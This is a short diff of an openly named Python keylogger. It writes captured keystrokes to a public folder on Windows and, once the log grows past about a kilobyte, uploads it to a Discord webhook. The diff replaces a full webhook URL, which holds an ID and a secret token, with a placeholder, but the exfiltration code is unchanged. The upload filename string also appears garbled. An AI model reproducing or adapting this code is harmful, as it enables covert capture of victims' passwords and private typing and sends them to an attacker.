@@ -25,7 +25,7 @@ def log_keystroke(key):
         f.write(key)
     size = os.path.getsize("C:\\Users\\Public\\log.txt") / 1000
     if size > 1:
-        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/805008211995787285/fXfGRNZXubCFltykjp-SPtXtHazXamvDaHHBh1caKAy9CyOSa-4IehtZFFTu0rot0q7M', username="KeyLogger data", content="KeyLogger log file: ")
+        webhook = DiscordWebhook(url='webhookhere', username="KeyLogger data", content="KeyLogger log file: ")
         with open("C:\\Users\\Public\\log.txt", "rb") as f:
             webhook.add_file(file=f.read(), filename='lC:\\Users\\Public\\og.txt')
         response = webhook.execute()
